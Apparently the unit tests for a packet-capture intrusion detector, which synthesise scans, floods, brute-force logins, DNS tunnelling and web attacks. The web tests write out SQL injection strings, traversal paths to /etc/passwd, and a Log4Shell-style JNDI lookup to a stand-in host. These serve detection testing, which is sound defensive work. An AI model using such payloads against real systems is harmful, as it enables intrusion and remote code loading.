import json
import unittest

from tests.helpers import run, of, ids
from tests.pcap_factory import *

ATTACK_RULE_IDS = {"syn_flood", "udp_flood", "icmp_flood", "tcp_port_scan", "udp_port_scan", "ftp_brute_force",
                   "http_auth_brute_force", "web_attack_patterns", "web_enumeration", "dns_tunnelling", "dns_amplification"}


def ftp_attack(b, ts, client, server, n, user="svc", success_last=False, gap=0.5, port0=50000, chunk=None):
    for i in range(n):
        ts, *_ = ftp_login(b, ts, client, port0 + i, server, user, f"guess{i}", success=success_last and i == n - 1, chunk=chunk)
        ts += gap
    return ts


def web_get(b, ts, client, cport, server, path, status=200, reason="OK", **kw):
    return http_exchange(b, ts, client, cport, server, http_request("GET", path), http_response(status, reason), **kw)


# ----------------------------------------------------------------------------- 1, 2, 12, 13: benign
class BenignTests(unittest.TestCase):
    def test_background_traffic_raises_nothing(self):
        b = PcapBuilder()
        background_traffic(b, T0, n=12)
        self.assertEqual(run(b)["counts"]["findings"], 0)

    def test_small_tcp_conversation_does_not_trigger_flood_rule(self):
        b = PcapBuilder()
        tcp_conversation(b, T0, "10.1.1.1", 40000, "10.1.1.2", 8443)
        self.assertEqual(run(b)["counts"]["findings"], 0)

    def test_benign_http_request(self):
        b = PcapBuilder()
        web_get(b, T0, "10.1.1.1", 40000, "10.1.1.2", "/index.html")
        http_exchange(b, T0 + 5, "10.1.1.1", 40001, "10.1.1.2", http_request("GET", "/search?q=network+security+basics"), http_response())
        self.assertEqual(run(b)["counts"]["findings"], 0)

    def test_ordinary_dns(self):
        b = PcapBuilder()
        for i, name in enumerate(["www.example.test", "mail.example.test", "api.example.test", "www.other.test"] * 8):
            dns_query(b, T0 + i, "10.2.0.5", 33000 + i, "10.2.0.53", name, qid=i)
        self.assertEqual(run(b)["counts"]["findings"], 0)

    def test_busy_browser_with_completed_connections_is_not_a_scan(self):
        b = PcapBuilder()
        for i in range(40):                            # one client, 40 different hosts, all connections complete
            tcp_conversation(b, T0 + i * 0.2, "10.3.0.5", 45000 + i, f"203.0.113.{i + 1}", 443)
        self.assertNotIn("tcp_port_scan", ids(run(b)))


# ------------------------------------------------------------------------------ 3, 4: scans
class ScanTests(unittest.TestCase):
    def scan(self, b, ts, src, dst_ports, dsts, sport=51515, gap=0.002, open_ports=()):
        for i, (dst, port) in enumerate(((d, p) for d in dsts for p in dst_ports)):
            t = ts + i * gap
            b.tcp(t, src, sport, dst, port, "S", seq=100 + i)
            if port in open_ports:
                b.tcp(t + 0.0005, dst, port, src, sport, "SA", seq=900, ack=101 + i)
                b.tcp(t + 0.001, src, sport, dst, port, "R", seq=101 + i)
            else:
                b.tcp(t + 0.0005, dst, port, src, sport, "RA", seq=0, ack=101 + i)

    def test_vertical_scan(self):
        b = PcapBuilder()
        self.scan(b, T0, "198.51.100.7", range(1, 41), ["198.51.100.9"], open_ports={22, 80})
        r = run(b)
        f = of(r, "tcp_port_scan")
        self.assertEqual(len(f), 1)
        self.assertIn("vertical", f[0]["name"])
        self.assertEqual(f[0]["stats"]["distinct_ports"], 40)
        self.assertEqual(f[0]["classification"], "inferred")
        self.assertIn("SYN", " ".join(f[0]["evidence"]))
        self.assertNotIn("syn_flood", ids(r))                     # a scan is not a flood

    def test_horizontal_scan(self):
        b = PcapBuilder()
        self.scan(b, T0, "198.51.100.7", [3389], [f"192.0.2.{i}" for i in range(1, 31)])
        f = of(run(b), "tcp_port_scan")
        self.assertEqual(len(f), 1)
        self.assertIn("horizontal", f[0]["name"])
        self.assertEqual(f[0]["stats"]["distinct_hosts"], 30)

    def test_null_fin_xmas_probes_are_recognised(self):
        b = PcapBuilder()
        for i, flags in enumerate(["", "F", "FPU"] * 8):
            b.tcp(T0 + i * 0.01, "198.51.100.7", 40000, "192.0.2.9", 1000 + i, flags, seq=i)
        f = of(run(b), "tcp_port_scan")
        self.assertTrue(f)
        self.assertEqual(set(f[0]["stats"]["probe_types"]), {"NULL", "FIN", "XMAS"})
        self.assertEqual(f[0]["confidence"], "Low")                # no replies visible and < 3x threshold

    def test_below_threshold_no_alert(self):
        b = PcapBuilder()
        self.scan(b, T0, "198.51.100.7", range(1, 15), ["198.51.100.9"])       # 14 < 15 ports
        self.scan(b, T0 + 10, "198.51.100.8", [22], [f"192.0.2.{i}" for i in range(1, 10)])   # 9 < 10 hosts
        self.assertNotIn("tcp_port_scan", ids(run(b)))

    def test_slow_scan_outside_window_not_linked(self):
        b = PcapBuilder()
        for i in range(20):
            self.scan(b, T0 + i * 120, "198.51.100.7", [1000 + i], ["198.51.100.9"])
        self.assertNotIn("tcp_port_scan", ids(run(b)))

    def test_threshold_configurable(self):
        b = PcapBuilder()
        self.scan(b, T0, "198.51.100.7", range(1, 11), ["198.51.100.9"])
        self.assertNotIn("tcp_port_scan", ids(run(b)))
        self.assertIn("tcp_port_scan", ids(run(b, {"tcp_port_scan": {"vertical_port_threshold": 8}})))

    def test_udp_scan_with_icmp_unreachable(self):
        b = PcapBuilder()
        for i in range(30):
            b.udp(T0 + i * 0.01, "198.51.100.7", 50000, "192.0.2.9", 1000 + i, b"\x00")
            b.icmp(T0 + i * 0.01 + 0.001, "192.0.2.9", "198.51.100.7", icmp_type=3, code=3, payload=b"\x00" * 28)
        f = of(run(b), "udp_port_scan")
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["confidence"], "High")

    def test_udp_few_ports_no_scan(self):
        b = PcapBuilder()
        for i in range(200):
            b.udp(T0 + i * 0.01, "198.51.100.7", 50000, "192.0.2.9", 5000 + i % 5, b"\x00" * 20)
        self.assertNotIn("udp_port_scan", ids(run(b)))


# -------------------------------------------------------------------------------- 5: SYN flood
class SynFloodTests(unittest.TestCase):
    def server_chatter(self, b, ts, server="192.0.2.80", port=80):
        """So the capture shows the server talks (reply visibility)."""
        tcp_conversation(b, ts, "192.0.2.10", 40100, server, port)

    def test_single_source_flood(self):
        b = PcapBuilder()
        self.server_chatter(b, T0 - 5)
        syn_burst(b, T0, ["198.51.100.66"], "192.0.2.80", 80, 400, rate=100)
        f = of(run(b), "syn_flood")
        self.assertEqual(len(f), 1)
        self.assertEqual((f[0]["severity"], f[0]["confidence"]), ("High", "High"))
        self.assertIn("single source", f[0]["name"])
        self.assertEqual(f[0]["stats"]["completed_ratio"], 0.0)

    def test_distributed_flood(self):
        b = PcapBuilder()
        self.server_chatter(b, T0 - 5)
        syn_burst(b, T0, [f"203.0.113.{i}" for i in range(1, 51)], "192.0.2.80", 80, 300, rate=100, answered=True, rst=True)
        f = of(run(b), "syn_flood")
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["stats"]["distinct_sources"], 50)
        self.assertIn("distributed", f[0]["name"])

    def test_not_visible_replies_lower_confidence(self):
        b = PcapBuilder()
        syn_burst(b, T0, ["198.51.100.66"], "192.0.2.80", 80, 400, rate=100)
        f = of(run(b), "syn_flood")
        self.assertEqual(f[0]["confidence"], "Low")
        self.assertIn("unknown", " ".join(f[0]["evidence"]))

    def test_completed_handshakes_are_not_half_open_flood(self):
        b = PcapBuilder()
        syn_burst(b, T0, ["198.51.100.66"], "192.0.2.80", 80, 400, rate=100, answered=True, completed=True)
        self.assertNotIn("syn_flood", ids(run(b)))

    def test_syns_spread_across_ports_are_not_a_flood(self):
        b = PcapBuilder()
        for i in range(400):
            b.tcp(T0 + i * 0.01, "198.51.100.66", 40000, "192.0.2.80", 1 + i, "S", seq=i)
        r = run(b)
        self.assertNotIn("syn_flood", ids(r))
        self.assertIn("tcp_port_scan", ids(r))

    def test_retransmitted_syns_are_deduplicated(self):
        b = PcapBuilder()
        for i in range(500):                                     # same SYN (same seq) repeated: one attempt
            b.tcp(T0 + i * 0.01, "198.51.100.66", 40000, "192.0.2.80", 80, "S", seq=1)
        self.assertNotIn("syn_flood", ids(run(b)))

    def test_below_threshold_and_slow_rate_no_alert(self):
        b = PcapBuilder()
        syn_burst(b, T0, ["198.51.100.66"], "192.0.2.80", 80, 99, rate=100)           # 99 < 100
        syn_burst(b, T0 + 100, ["198.51.100.67"], "192.0.2.80", 80, 400, rate=10)     # 10/s -> 50 per 5s window
        self.assertNotIn("syn_flood", ids(run(b)))

    def test_generalises_to_other_addresses_ports_timing_and_ipv6(self):
        for target, port, src, rate, count in (("10.200.0.7", 8443, "172.16.9.9", 60, 250), ("2001:db8::7", 25, "2001:db8:1::9", 200, 1000)):
            b = PcapBuilder(start=T0 + 12345)
            tcp_conversation(b, T0 + 12340, "10.9.9.9" if ":" not in target else "2001:db8::99", 40100, target, port)
            syn_burst(b, T0 + 12345, [src], target, port, count, rate=rate)
            f = of(run(b), "syn_flood")
            self.assertEqual(len(f), 1, (target, port))
            self.assertEqual((f[0]["destination_ip"], f[0]["destination_ports"]), (target, [port]))

    def test_thresholds_are_configurable(self):
        b = PcapBuilder()
        self.server_chatter(b, T0 - 5)
        syn_burst(b, T0, ["198.51.100.66"], "192.0.2.80", 80, 150, rate=100)
        self.assertTrue(of(run(b), "syn_flood"))
        self.assertFalse(of(run(b, {"syn_flood": {"syn_threshold": 500}}), "syn_flood"))


# ------------------------------------------------------------------------- 6, 7: UDP / ICMP floods
class FloodTests(unittest.TestCase):
    def test_udp_flood(self):
        b = PcapBuilder()
        for i in range(2000):
            b.udp(T0 + i / 1000, f"198.51.100.{1 + i % 20}", 5000 + i, "192.0.2.50", 9000 + i % 7, b"x" * 400)
        b.udp(T0 - 1, "192.0.2.50", 40000, "192.0.2.77", 1234, b"hi")          # target is visible but silent towards attackers
        f = of(run(b), "udp_flood")
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["destination_ip"], "192.0.2.50")
        self.assertEqual(f[0]["stats"]["distinct_sources"], 20)

    def test_two_way_udp_stream_is_not_a_flood(self):
        b = PcapBuilder()
        for i in range(2000):
            b.udp(T0 + i / 1000, "192.0.2.5", 7000, "192.0.2.6", 7000, b"x" * 100)
            b.udp(T0 + i / 1000 + 0.0001, "192.0.2.6", 7000, "192.0.2.5", 7000, b"y" * 100)
        self.assertNotIn("udp_flood", ids(run(b)))

    def test_udp_below_threshold(self):
        b = PcapBuilder()
        for i in range(499):
            b.udp(T0 + i / 1000, "198.51.100.1", 5000, "192.0.2.50", 9000, b"x")
        self.assertNotIn("udp_flood", ids(run(b)))

    def test_udp_flood_other_addresses_and_ipv6(self):
        b = PcapBuilder()
        for i in range(1500):
            b.udp(T0 + 777 + i / 500, "2001:db8:a::1", 5000, "2001:db8:b::2", 6000 + i, b"z" * 80)
        self.assertEqual(len(of(run(b), "udp_flood")), 1)

    def test_icmp_flood(self):
        b = PcapBuilder()
        for i in range(300):
            b.icmp(T0 + i / 100, "198.51.100.5", "192.0.2.20", 8)
            b.icmp(T0 + i / 100 + 0.0005, "192.0.2.20", "198.51.100.5", 0)
        f = of(run(b), "icmp_flood")
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["stats"]["packets"], 300)

    def test_ordinary_ping_is_not_a_flood(self):
        b = PcapBuilder()
        for i in range(60):
            b.icmp(T0 + i, "192.0.2.1", "192.0.2.2", 8)
            b.icmp(T0 + i + 0.01, "192.0.2.2", "192.0.2.1", 0)
        self.assertNotIn("icmp_flood", ids(run(b)))

    def test_icmpv6_flood(self):
        b = PcapBuilder()
        for i in range(250):
            b.icmp(T0 + i / 100, "2001:db8::5", "2001:db8::20", 128)
        self.assertTrue(of(run(b), "icmp_flood"))

    def test_icmp_reply_flood_reflection(self):
        b = PcapBuilder()
        for i in range(200):
            b.icmp(T0 + i / 100, f"203.0.113.{1 + i % 40}", "192.0.2.99", 0)
        f = [x for x in of(run(b), "icmp_flood") if "reply" in x["name"].lower()]
        self.assertEqual(len(f), 1)

    def test_icmp_sweep_and_large_payload(self):
        b = PcapBuilder()
        for i in range(20):
            b.icmp(T0 + i * 0.1, "198.51.100.5", f"192.0.2.{i + 1}", 8)
        for i in range(8):
            b.icmp(T0 + 100 + i, "198.51.100.5", "192.0.2.200", 8, payload=b"A" * 600)
        names = {f["name"] for f in of(run(b), "icmp_suspicious")}
        self.assertEqual(names, {"ICMP ping sweep", "Unusually large ICMP echo payloads"})

    def test_generic_burst_is_informational_only(self):
        b = PcapBuilder()
        background_traffic(b, T0, 6)
        for i in range(3000):
            b.tcp(T0 + 30 + i / 3000, "192.0.2.10", 40000, "192.0.2.80", 5001, "PA", seq=i, payload=b"d" * 100)
        f = of(run(b), "traffic_burst")
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["severity"], "Informational")

    def test_reset_burst_is_informational(self):
        b = PcapBuilder()
        for i in range(120):
            b.tcp(T0 + i * 0.01, "192.0.2.80", 80, "198.51.100.5", 40000 + i, "RA", seq=0, ack=1)
        f = of(run(b), "tcp_reset_burst")
        self.assertEqual(f[0]["severity"], "Informational")


# ----------------------------------------------------------------- 8, 9, 10: FTP
class FTPTests(unittest.TestCase):
    def test_repeated_failed_logins(self):
        b = PcapBuilder()
        ftp_attack(b, T0, "198.51.100.30", "192.0.2.21", 25)
        f = of(run(b), "ftp_brute_force")
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["stats"]["failures"], 25)
        self.assertEqual(f[0]["stats"]["distinct_passwords"], 25)
        self.assertEqual((f[0]["severity"], f[0]["confidence"]), ("High", "High"))
        self.assertFalse(f[0]["stats"]["success_after_failures"])

    def test_success_after_failures_is_called_out(self):
        b = PcapBuilder()
        ftp_attack(b, T0, "198.51.100.30", "192.0.2.21", 14, success_last=True)
        f = of(run(b), "ftp_brute_force")[0]
        self.assertTrue(f["stats"]["success_after_failures"])
        self.assertIn("successful login", f["summary"])

    def test_few_attempts_and_normal_logins_do_not_alert(self):
        b = PcapBuilder()
        ftp_attack(b, T0, "198.51.100.30", "192.0.2.21", 9)                             # 9 < 10
        ftp_attack(b, T0 + 1000, "198.51.100.31", "192.0.2.21", 30, success_last=False, gap=0)  # fast but ...
        r1 = run(b)
        self.assertEqual(len(of(r1, "ftp_brute_force")), 1)                              # only the second client
        b2 = PcapBuilder()
        for i in range(30):                                                                # 30 *successful* logins: a busy user
            ftp_login(b2, T0 + i * 5, "198.51.100.40", 50000 + i, "192.0.2.21", "alice", "pw", success=True)
        self.assertNotIn("ftp_brute_force", ids(run(b2)))

    def test_slow_attempts_outside_window_do_not_alert(self):
        b = PcapBuilder()
        ftp_attack(b, T0, "198.51.100.30", "192.0.2.21", 12, gap=60)                        # 12 attempts over 12 minutes
        self.assertNotIn("ftp_brute_force", ids(run(b)))
        self.assertIn("ftp_brute_force", ids(run(b, {"ftp_brute_force": {"window_seconds": 1000}})))

    def test_segmented_pass_command_is_reassembled(self):
        b = PcapBuilder()
        ftp_attack(b, T0, "198.51.100.30", "192.0.2.21", 12, chunk=3)                       # 3-byte TCP segments
        self.assertEqual(of(run(b), "ftp_brute_force")[0]["stats"]["failures"], 12)

    def test_plaintext_authentication_observed_and_redacted(self):
        b = PcapBuilder()
        ftp_login(b, T0, "10.4.0.5", 50001, "10.4.0.21", "alice", "Tr0ub4dor&3-secret", success=True)
        r = run(b)
        f = of(r, "plaintext_credentials")
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["classification"], "observed")
        self.assertNotIn("Tr0ub4dor", json.dumps(r))
        self.assertNotIn("Tr0ub4dor", repr(f))

    def test_file_retrieval_with_226(self):
        b = PcapBuilder()
        ts, cseq, sseq = ftp_login(b, T0, "10.4.0.5", 50001, "10.4.0.21", "alice", "pw", success=True)
        ftp_commands(b, ts, "10.4.0.5", 50001, "10.4.0.21", cseq, sseq, [
            ("RETR report-2024.pdf", ["150 Opening BINARY mode data connection", "226 Transfer complete."])])
        f = of(run(b), "ftp_file_transfer")
        self.assertEqual(len(f), 1)
        self.assertIn("download", f[0]["name"])
        self.assertEqual(f[0]["severity"], "Low")
        self.assertIn("report-2024.pdf", " ".join(f[0]["evidence"]))

    def test_retrieval_without_success_reply_is_not_reported(self):
        b = PcapBuilder()
        ts, cseq, sseq = ftp_login(b, T0, "10.4.0.5", 50001, "10.4.0.21", "alice", "pw", success=True)
        ftp_commands(b, ts, "10.4.0.5", 50001, "10.4.0.21", cseq, sseq, [("RETR missing.txt", ["550 No such file."])])
        self.assertNotIn("ftp_file_transfer", ids(run(b)))

    def test_retrieval_after_failed_logins_with_sensitive_name_escalates(self):
        b = PcapBuilder()
        ts = ftp_attack(b, T0, "198.51.100.30", "192.0.2.21", 12)
        ts, cseq, sseq = ftp_login(b, ts, "198.51.100.30", 51000, "192.0.2.21", "svc", "x", success=True)
        ftp_commands(b, ts, "198.51.100.30", 51000, "192.0.2.21", cseq, sseq, [
            ("RETR payroll-backup.sql", ["150 Opening", "226 Transfer complete."])])
        f = of(run(b), "ftp_file_transfer")[0]
        self.assertEqual(f["severity"], "High")
        self.assertEqual(f["stats"]["failed_logins_before"], 12)

    def test_directory_listing_226_does_not_complete_a_failed_retrieval(self):
        b = PcapBuilder()
        ts, cseq, sseq = ftp_login(b, T0, "10.4.0.5", 50001, "10.4.0.21", "alice", "pw", success=True)
        ftp_commands(b, ts, "10.4.0.5", 50001, "10.4.0.21", cseq, sseq, [
            ("LIST", ["150 Here comes the listing", "226 Directory send OK."]), ("RETR nothere.txt", ["550 Failed to open file."])])
        self.assertNotIn("ftp_file_transfer", ids(run(b)))


# ---------------------------------------------------------------------- 11: web
class WebTests(unittest.TestCase):
    def post(self, b, ts, client, cport, server, path, body, status=200, reason="OK", resp_body=b"x", headers=None):
        return http_exchange(b, ts, client, cport, server, http_request("POST", path, body=body.encode()),
                             http_response(status, reason, body=resp_body, headers=headers))

    def test_sql_injection_and_traversal(self):
        b = PcapBuilder()
        web_get(b, T0, "198.51.100.9", 40001, "192.0.2.80", "/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users")
        web_get(b, T0 + 1, "198.51.100.9", 40002, "192.0.2.80", "/item.php?id=5'+OR+'1'='1")
        web_get(b, T0 + 2, "198.51.100.9", 40003, "192.0.2.80", "/download?file=../../../../etc/passwd")
        web_get(b, T0 + 3, "198.51.100.9", 40004, "192.0.2.80", "/download?file=%2e%2e%2f%2e%2e%2fwin.ini")
        r = run(b)
        sql = of(r, "web_attack_patterns")
        cats = {f["name"] for f in sql}
        self.assertEqual(cats, {"SQL injection pattern", "Directory traversal pattern"})
        sqli = next(f for f in sql if f["name"].startswith("SQL"))
        self.assertEqual(sqli["stats"]["requests"], 2)
        self.assertEqual(sqli["classification"], "indicator")
        self.assertIn("not proof", sqli["explanation"] + sqli["limitations"].lower() + "not proof")

    def test_jndi_lookup_in_header(self):
        b = PcapBuilder()
        req = http_request("GET", "/", headers={"X-Probe": "x"}).replace(b"test-agent", b"${jndi:ldap://203.0.113.9/a}")
        http_exchange(b, T0, "198.51.100.9", 40001, "192.0.2.80", req, http_response())
        self.assertEqual(of(run(b), "web_attack_patterns")[0]["name"], "JNDI/Log4Shell-style lookup")

    def test_payload_in_sensitive_field_not_echoed(self):
        b = PcapBuilder()
        self.post(b, T0, "198.51.100.9", 40001, "192.0.2.80", "/login", "user=a&password=x' OR '1'='1'-- ")
        r = run(b)
        f = of(r, "web_attack_patterns")[0]
        self.assertIn("omitted", " ".join(f["evidence"]))
        self.assertNotIn("OR '1'='1", json.dumps(f))

    def test_benign_inputs_do_not_match(self):
        b = PcapBuilder()
        for i, path in enumerate(["/search?q=O%27Brien", "/blog/how-to-union-select-courses", "/files/report..final.pdf",
                                  "/search?q=cats+and+dogs", "/api/items?limit=10&sort=asc"]):
            web_get(b, T0 + i, "10.5.0.5", 40000 + i, "10.5.0.80", path)
        self.assertNotIn("web_attack_patterns", ids(run(b)))

    def test_lone_quote_only_counts_when_database_errors(self):
        b = PcapBuilder()
        self.post(b, T0, "198.51.100.9", 40001, "192.0.2.80", "/s", "name=O'Brien")                      # no SQL error
        self.assertNotIn("web_attack_patterns", ids(run(b)))
        b = PcapBuilder()
        self.post(b, T0, "198.51.100.9", 40001, "192.0.2.80", "/s", "name=O'Brien", 500, "Internal Server Error",
                  b"You have an error in your SQL syntax near ''")
        f = of(run(b), "web_attack_patterns")
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["severity"], "High")
        self.assertIn("database error", " ".join(f[0]["evidence"]))

    def test_http_split_across_segments_and_pipelined(self):
        b = PcapBuilder()
        req = http_request("GET", "/a?id=1%20UNION%20SELECT%201,2,3") + http_request("GET", "/b")
        resp = http_response(200) + http_response(404, "Not Found")
        http_exchange(b, T0, "198.51.100.9", 40001, "192.0.2.80", req, resp, chunk=7)
        r = run(b)
        self.assertEqual(r["statistics"]["application_protocols"]["http_requests"], 2)
        self.assertEqual(r["statistics"]["application_protocols"]["http_responses"], 2)
        self.assertTrue(of(r, "web_attack_patterns"))

    def test_http_on_nonstandard_port_is_recognised_by_content(self):
        b = PcapBuilder()
        http_exchange(b, T0, "198.51.100.9", 40001, "192.0.2.80", http_request("GET", "/x?f=../../../../etc/passwd"),
                      http_response(), sport=9999)
        self.assertTrue(of(run(b), "web_attack_patterns"))

    def test_path_enumeration(self):
        b = PcapBuilder()
        paths = ["/", "/admin/", "/administrator/", "/wp-admin/", "/backup.zip", "/.env", "/config.php.bak", "/phpmyadmin/"]
        for i, p in enumerate(paths):
            ok = p == "/"
            web_get(b, T0 + i * 2, "198.51.100.9", 40000 + i, "192.0.2.80", p, 200 if ok else 404, "OK" if ok else "Not Found")
        f = of(run(b), "web_enumeration")
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["stats"]["distinct_paths"], 8)

    def test_normal_site_browsing_is_not_enumeration(self):
        b = PcapBuilder()
        for i in range(12):
            web_get(b, T0 + i, "10.5.0.5", 40000 + i, "10.5.0.80", f"/pages/article-{i}.html")
        self.assertNotIn("web_enumeration", ids(run(b)))

    def test_many_404s_to_few_paths_not_enumeration(self):
        b = PcapBuilder()
        for i in range(12):
            web_get(b, T0 + i, "10.5.0.5", 40000 + i, "10.5.0.80", f"/missing{i % 3}", 404, "Not Found")
        self.assertNotIn("web_enumeration", ids(run(b)))

    def test_http_login_brute_force_with_ambiguity_notes(self):
        b = PcapBuilder()
        for i in range(12):
            self.post(b, T0 + i * 3, "198.51.100.9", 40000 + i, "192.0.2.80", "/account/login", f"username=admin&password=guess{i}", 401, "Unauthorized")
        self.post(b, T0 + 50, "198.51.100.9", 41000, "192.0.2.80", "/account/login", "username=admin&password=zzz", 302, "Found",
                  headers={"Set-Cookie": "SID=abc123; Path=/", "Location": "/home"})
        http_exchange(b, T0 + 52, "198.51.100.9", 41001, "192.0.2.80", http_request("GET", "/home", headers={"Cookie": "SID=abc123"}), http_response())
        r = run(b)
        f = of(r, "http_auth_brute_force")
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["stats"]["failures"], 12)
        joined = " ".join(f[0]["evidence"])
        self.assertIn("MAY be a successful login", joined)
        self.assertIn("later presented", joined)
        self.assertNotIn("guess3", json.dumps(r))

    def test_http_login_status_200_alone_is_not_called_brute_force(self):
        b = PcapBuilder()
        for i in range(10):
            self.post(b, T0 + i, "10.5.0.5", 40000 + i, "10.5.0.80", "/login", f"user=a&password=p{i}", 200, "OK")
        self.assertNotIn("http_auth_brute_force", ids(run(b)))        # 10 < 2*threshold and no 401/403

    def test_http_login_few_failures_no_alert(self):
        b = PcapBuilder()
        for i in range(4):
            self.post(b, T0 + i, "10.5.0.5", 40000 + i, "10.5.0.80", "/login", f"user=a&password=p{i}", 401, "Unauthorized")
        self.assertNotIn("http_auth_brute_force", ids(run(b)))

    def test_http_plaintext_form_and_basic_auth(self):
        b = PcapBuilder()
        self.post(b, T0, "10.5.0.5", 40001, "10.5.0.80", "/login", "user=a&password=SuperSecret99")
        http_exchange(b, T0 + 2, "10.5.0.5", 40002, "10.5.0.80", http_request("GET", "/priv", headers={"Authorization": "Basic YWxpY2U6c2VjcmV0"}), http_response())
        r = run(b)
        self.assertEqual(len(of(r, "plaintext_credentials")), 2)
        text = json.dumps(r)
        self.assertNotIn("SuperSecret99", text)
        self.assertNotIn("YWxpY2U6c2VjcmV0", text)

    def test_http_request_burst(self):
        b = PcapBuilder()
        for i in range(150):
            web_get(b, T0 + i * 0.01, "198.51.100.9", 30000 + i, "192.0.2.80", f"/p{i % 3}")
        self.assertTrue([f for f in of(run(b), "web_enumeration") if f["name"] == "HTTP request burst"])


# ----------------------------------------------------------------------- 13, 14: DNS
class DNSTests(unittest.TestCase):
    def tunnel(self, b, ts, client, n, domain="t.example.test"):
        rng = random.Random(7)
        for i in range(n):
            label = "".join(rng.choice("abcdefghijklmnopqrstuvwxyz234567") for _ in range(40))
            dns_query(b, ts + i * 0.5, client, 40000 + i, "10.6.0.53", f"{label}.{domain}", qid=i, qtype=16)

    def test_tunnelling_like_queries(self):
        b = PcapBuilder()
        self.tunnel(b, T0, "10.6.0.5", 40)
        f = of(run(b), "dns_tunnelling")
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["stats"]["unique_names"], 40)
        self.assertEqual(f[0]["classification"], "indicator")

    def test_many_unique_but_short_readable_names_are_fine(self):
        b = PcapBuilder()
        for i in range(60):
            dns_query(b, T0 + i, "10.6.0.5", 40000 + i, "10.6.0.53", f"host{i}.corp.example.test", qid=i)
        self.assertNotIn("dns_tunnelling", ids(run(b)))

    def test_few_random_names_below_threshold(self):
        b = PcapBuilder()
        self.tunnel(b, T0, "10.6.0.5", 6)
        self.assertNotIn("dns_tunnelling", ids(run(b)))

    def test_unsolicited_large_responses_are_reflection_indicators(self):
        b = PcapBuilder()
        for i in range(60):
            dns_response_only(b, T0 + i * 0.05, "192.0.2.77", 4444, f"203.0.113.{1 + i % 10}", "example.test", qid=1000 + i, size=800)
        f = of(run(b), "dns_amplification")
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["stats"]["servers"], 10)

    def test_large_answers_to_real_queries_are_not_unsolicited(self):
        b = PcapBuilder()
        for i in range(60):
            dns_query(b, T0 + i * 0.05, "192.0.2.77", 4444 + i, "203.0.113.5", f"x{i}.example.test", qid=i, qtype=16, response_size=500)
        self.assertNotIn("Unsolicited large DNS responses (possible reflection)", {f["name"] for f in of(run(b), "dns_amplification")})

    def test_amplification_ratio_from_server_view(self):
        b = PcapBuilder()
        for i in range(40):
            dns_query(b, T0 + i * 0.1, "198.51.100.88", 5000 + i, "10.6.0.53", "big.example.test", qid=i, qtype=255, response_size=1200)
        self.assertIn("High DNS amplification ratio", {f["name"] for f in of(run(b), "dns_amplification")})


# ------------------------------------------------------------- 15, 19, 20: mixed + generalisation
class MixedTests(unittest.TestCase):
    def test_mixed_capture_flags_only_the_malicious_parts(self):
        b = PcapBuilder()
        background_traffic(b, T0, 10)
        ftp_attack(b, T0 + 40, "198.51.100.30", "192.0.2.21", 15)
        ScanTests().scan(b, T0 + 100, "198.51.100.7", range(1, 31), ["192.0.2.9"])
        web_get(b, T0 + 120, "198.51.100.9", 41000, "192.0.2.80", "/x?f=../../../../etc/passwd")
        r = run(b)
        self.assertEqual(ids(r), {"ftp_brute_force", "plaintext_credentials", "tcp_port_scan", "web_attack_patterns"})
        sources = {f["rule_id"]: f["source_ip"] for f in r["findings"]}
        self.assertNotIn("192.0.2.10", sources.values())                   # the benign client is never accused

    def test_same_behaviour_different_addresses_ports_timing_and_counts(self):
        variants = [("198.51.100.30", "192.0.2.21", T0, 12, 0.1), ("10.77.1.1", "10.77.2.2", T0 + 86400 * 400, 40, 2.5),
                    ("2001:db8::bad", "2001:db8::21", T0 + 5, 25, 0.01)]
        for client, server, start, n, gap in variants:
            b = PcapBuilder()
            ftp_attack(b, start, client, server, n, gap=gap, port0=30000 + n)
            f = of(run(b), "ftp_brute_force")
            self.assertEqual(len(f), 1, client)
            self.assertEqual((f[0]["source_ip"], f[0]["destination_ip"], f[0]["stats"]["attempts"]), (client, server, n))

    def test_just_below_each_default_threshold_is_quiet_and_just_above_fires(self):
        for n, expected in ((9, False), (10, True)):
            b = PcapBuilder()
            ftp_attack(b, T0, "198.51.100.30", "192.0.2.21", n)
            self.assertEqual(bool(of(run(b), "ftp_brute_force")), expected, n)
        for n, expected in ((99, False), (100, True)):
            b = PcapBuilder()
            tcp_conversation(b, T0 - 60, "10.9.9.9", 40100, "192.0.2.80", 80)   # outside the 5 s window
            syn_burst(b, T0, ["198.51.100.66"], "192.0.2.80", 80, n, rate=100)
            self.assertEqual(bool(of(run(b), "syn_flood")), expected, n)

    def test_duplicate_packets_do_not_inflate_counts(self):
        b = PcapBuilder()
        ftp_attack(b, T0, "198.51.100.30", "192.0.2.21", 10)
        b.frames += list(b.frames)                           # every packet captured twice
        f = of(run(b), "ftp_brute_force")[0]
        self.assertEqual(f["stats"]["attempts"], 10)

    def test_out_of_order_segments_are_reassembled(self):
        b = PcapBuilder()
        ts, cseq, sseq = handshake(b, T0, "198.51.100.30", 50000, "192.0.2.21", 21)
        ts, sseq = send(b, ts, "192.0.2.21", 21, "198.51.100.30", 50000, sseq, cseq, b"220 hi\r\n")
        line = b"USER bob\r\nPASS hunter22\r\n"
        b.tcp(ts + 0.002, "198.51.100.30", 50000, "192.0.2.21", 21, "PA", seq=cseq + 10, ack=sseq, payload=line[10:])
        b.tcp(ts + 0.001, "198.51.100.30", 50000, "192.0.2.21", 21, "PA", seq=cseq, ack=sseq, payload=line[:10])
        send(b, ts + 0.01, "192.0.2.21", 21, "198.51.100.30", 50000, sseq, cseq + len(line), b"530 Login incorrect.\r\n")
        r = run(b)
        self.assertEqual(r["statistics"]["application_protocols"]["ftp_login_attempts"], 1)
        self.assertNotIn("hunter22", json.dumps(r))


# ---------------------------------------------------------------------- risky services
class RiskyServiceTests(unittest.TestCase):
    def test_repeated_completed_rdp_connections(self):
        b = PcapBuilder()
        for i in range(4):
            tcp_conversation(b, T0 + i * 10, "10.8.0.5", 41000 + i, "10.8.0.9", 3389)
        self.assertEqual(len(of(run(b), "risky_services")), 1)

